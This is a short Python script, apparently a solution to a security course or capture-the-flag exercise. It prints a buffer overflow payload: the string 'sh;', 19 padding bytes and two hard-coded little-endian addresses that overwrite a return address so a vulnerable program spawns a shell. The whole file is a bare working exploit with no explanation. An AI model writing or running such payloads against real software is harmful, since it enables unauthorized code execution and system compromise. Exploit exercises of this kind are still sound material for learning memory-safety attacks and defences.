#!/usr/bin/python

from shellcode import shellcode
from struct import pack

if __name__ == '__main__':
    print "sh;" + "\x41"*19 + pack("<I", 0x0804888A) + pack("<I", 0xBFFEF5D6)
